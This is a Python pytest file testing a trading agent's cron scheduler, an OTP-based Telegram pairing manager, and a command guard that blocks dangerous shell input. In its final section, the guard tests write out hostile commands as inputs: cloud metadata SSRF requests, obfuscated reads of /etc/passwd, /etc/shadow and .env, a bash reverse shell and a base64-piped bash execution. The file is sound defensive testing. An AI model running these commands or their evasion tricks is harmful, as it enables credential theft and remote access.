# ==============================================================================
# File: tests/scheduler/test_phase4_unified_cron_and_security.py
# ==============================================================================

"""
Unit Tests for Phase 4:
  1. UnifiedCronEngine (At-most-once semantics, NLP/market schedules, token suppression)
  2. PairingManager (8-character salted OTP paired DM security)
  3. TerminalGuard (Cloud IMDS SSRF blocklist & de-obfuscation quote masking)
"""

import os
import tempfile
import time
import pytest

from gateway.pairing import PairingManager, PairedUserRecord
from scheduler.unified_cron_engine import (
    UnifiedCronEngine,
    UnifiedCronJob,
    compute_next_cron_timestamp,
)
from security.terminal_guard import (
    CommandSecurityViolationError,
    deobfuscate_command,
    is_hardline_blocked_command,
    validate_command,
)


@pytest.fixture
def temp_cron_db():
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    yield path
    if os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass


@pytest.fixture
def temp_pairing_file():
    fd, path = tempfile.mkstemp(suffix=".json")
    os.close(fd)
    yield path
    if os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass


# ==============================================================================
# 1. UnifiedCronEngine Tests
# ==============================================================================

def test_unified_cron_schedule_parsing_and_market_presets(temp_cron_db):
    engine = UnifiedCronEngine(db_path=temp_cron_db)
    now = time.time()

    # Relative duration
    next_ts, desc = engine.parse_schedule_expression("15m", from_timestamp=now)
    assert abs((next_ts - now) - 900.0) < 1.0
    assert "15 m" in desc or "Interval" in desc

    # Natural language interval
    next_ts, desc = engine.parse_schedule_expression("every 5 minutes", from_timestamp=now)
    assert next_ts > now
    assert "5 minutes" in desc

    # Market session preset (London Open)
    next_ts, desc = engine.parse_schedule_expression("london_open", from_timestamp=now)
    assert next_ts > now
    assert "London Session Open" in desc

    # 5-part cron forward timestamp computation
    cron_ts = compute_next_cron_timestamp("*/10 * * * *", from_ts=now)
    assert cron_ts > now
    assert (cron_ts - now) <= 600.0


def test_unified_cron_registration_and_at_most_once(temp_cron_db):
    engine = UnifiedCronEngine(db_path=temp_cron_db)
    
    # Register job
    job = engine.register_job(
        job_id="test_cot_sync",
        schedule_expression="every 1 hour",
        prompt="Sync CFTC COT institutional data",
        target_delivery="telegram",
        target_destination="123456789",
    )
    assert job.job_id == "test_cot_sync"
    assert job.is_active is True

    # Retrieve job
    retrieved = engine.get_job("test_cot_sync")
    assert retrieved is not None
    assert retrieved.prompt == "Sync CFTC COT institutional data"
    assert retrieved.target_destination == "123456789"

    # Verify At-Most-Once execution semantic: simulate due job evaluation
    executed_jobs = []

    def mock_runner(executed_job: UnifiedCronJob):
        executed_jobs.append(executed_job.job_id)

    engine.register_execution_callback(mock_runner)

    # Force job to be due now
    with engine._lock:
        import sqlite3
        conn = sqlite3.connect(temp_cron_db)
        conn.execute("UPDATE cron_jobs SET next_run_at = ? WHERE job_id = ?", (time.time() - 10, "test_cot_sync"))
        conn.commit()
        conn.close()

    # Evaluate due jobs
    engine._evaluate_due_jobs()
    assert "test_cot_sync" in executed_jobs

    # Check that next_run_at was advanced and pending_slot was cleared after finish
    after_job = engine.get_job("test_cot_sync")
    assert after_job.next_run_at > time.time()
    assert after_job.pending_slot is False
    assert after_job.last_run_at is not None


def test_unified_cron_zero_cost_token_suppression(temp_cron_db):
    engine = UnifiedCronEngine(db_path=temp_cron_db)
    executed_prompts = []

    engine.register_execution_callback(lambda j: executed_prompts.append(j.prompt))

    # Register job with monitor script (echo same constant output)
    engine.register_job(
        job_id="monitor_check",
        schedule_expression="10m",
        prompt="Analyze data difference",
        monitor_script="echo constant_output",
        no_agent=True,
    )

    # First run: output hash is recorded, job executes
    with engine._lock:
        import sqlite3
        conn = sqlite3.connect(temp_cron_db)
        conn.execute("UPDATE cron_jobs SET next_run_at = ? WHERE job_id = ?", (time.time() - 10, "monitor_check"))
        conn.commit()
        conn.close()

    engine._evaluate_due_jobs()
    assert len(executed_prompts) == 1

    # Second run: output is identical, execution must be suppressed (zero tokens spent)
    with engine._lock:
        import sqlite3
        conn = sqlite3.connect(temp_cron_db)
        conn.execute("UPDATE cron_jobs SET next_run_at = ? WHERE job_id = ?", (time.time() - 10, "monitor_check"))
        conn.commit()
        conn.close()

    engine._evaluate_due_jobs()
    # Length should remain 1 because token suppression bypassed the second run
    assert len(executed_prompts) == 1


# ==============================================================================
# 2. PairingManager Tests
# ==============================================================================

def test_pairing_manager_lifecycle(temp_pairing_file):
    mgr = PairingManager(store_path=temp_pairing_file)

    # Initial state: user is not paired
    assert not mgr.is_user_paired("telegram", "user_999")

    # Generate pairing challenge
    msg, otp_code = mgr.create_pairing_request("telegram", "user_999", username="test_trader", ttl_seconds=60)
    assert len(otp_code) == 9  # format XXXX-XXXX (8 chars + 1 hyphen)
    assert "Pairing Authorization Required" in msg

    # Invalid code attempt
    success, reason = mgr.verify_pairing_code("telegram", "user_999", "WRONG-CODE")
    assert not success
    assert "remaining" in reason.lower() or "tersisa" in reason.lower()
    assert not mgr.is_user_paired("telegram", "user_999")

    # Valid code attempt
    success, ok_msg = mgr.verify_pairing_code("telegram", "user_999", otp_code)
    assert success
    assert "pairing successful" in ok_msg.lower() or "berhasil" in ok_msg.lower()

    # User is now paired and persisted
    assert mgr.is_user_paired("telegram", "user_999")
    paired_rec = mgr.get_paired_user("telegram", "user_999")
    assert paired_rec.username == "test_trader"

    # Reload from disk to verify atomic persistence
    fresh_mgr = PairingManager(store_path=temp_pairing_file)
    assert fresh_mgr.is_user_paired("telegram", "user_999")

    # Unpair user
    assert fresh_mgr.unpair_user("telegram", "user_999")
    assert not fresh_mgr.is_user_paired("telegram", "user_999")


# ==============================================================================
# 3. TerminalGuard Cloud IMDS & De-obfuscation Tests
# ==============================================================================

def test_terminal_guard_cloud_imds_blocking():
    # AWS / GCP / Azure IMDS endpoint
    imds_cmd1 = "curl -s http://169.254.169.254/latest/meta-data/"
    blocked, reason = is_hardline_blocked_command(imds_cmd1)
    assert blocked
    assert "169.254.169.254" in reason or "prohibited security signature" in reason

    # Google Cloud Metadata internal host
    imds_cmd2 = "wget http://metadata.google.internal/computeMetadata/v1/"
    blocked, reason = is_hardline_blocked_command(imds_cmd2)
    assert blocked

    # Alibaba Cloud IMDS
    imds_cmd3 = "curl http://100.100.100.200/latest/meta-data/"
    blocked, reason = is_hardline_blocked_command(imds_cmd3)
    assert blocked


def test_terminal_guard_quote_and_hex_deobfuscation():
    # 1. Quote evasion on shadow file: c'a't /e"t"c/p'a'sswd
    evasion_cmd = "c'a't /e\"t\"c/passwd"
    deob = deobfuscate_command(evasion_cmd)
    assert "cat /etc/passwd" in deob

    blocked, _ = is_hardline_blocked_command(evasion_cmd)
    assert blocked

    # 2. PowerShell backtick evasion: c`a`t .env
    ps_evasion = "c`a`t .env"
    blocked, _ = is_hardline_blocked_command(ps_evasion)
    assert blocked

    # 3. Hex escape evasion: \x63\x61\x74 /etc/shadow -> cat /etc/shadow
    hex_evasion = "\\x63\\x61\\x74 /etc/shadow"
    blocked, _ = is_hardline_blocked_command(hex_evasion)
    assert blocked

    # 4. Reverse shell pipe
    rev_shell = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    blocked, _ = is_hardline_blocked_command(rev_shell)
    assert blocked

    # 5. Base64 piped execution
    b64_pipe = "echo bWtpcmUgLXAgL3RtcA== | base64 -d | bash"
    blocked, _ = is_hardline_blocked_command(b64_pipe)
    assert blocked

    # 6. Legitimate commands must pass smoothly
    safe_cmds = [
        "python main.py --dry-run",
        "git status --short",
        "pytest trading-agent/tests/ -v",
        "ls -la data/",
    ]
    for cmd in safe_cmds:
        blocked, _ = is_hardline_blocked_command(cmd)
        assert not blocked, f"Safe command '{cmd}' should not be blocked."
